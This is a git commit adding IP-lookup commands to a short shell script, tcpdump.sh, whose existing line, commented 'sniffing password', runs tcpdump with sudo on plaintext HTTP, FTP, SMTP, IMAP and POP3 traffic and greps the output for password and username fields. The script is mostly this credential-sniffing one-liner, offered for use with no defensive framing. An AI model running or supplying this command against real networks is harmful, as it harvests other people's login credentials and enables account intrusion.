6d83e51038c2a9d2212305ebda9a1b7215d4a3c6
edwardcooper <maxminicherrycc@gmail.com>
2019-06-25 02:09:12 -0400

    add ip addr lookup

--- tcpdump.sh
+++ tcpdump.sh
@@ -1,2 +1,6 @@
+# internal ip 
+hostname -I 
+ifconfig -a | grep inet 
+
 # sniffing password 
 sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20
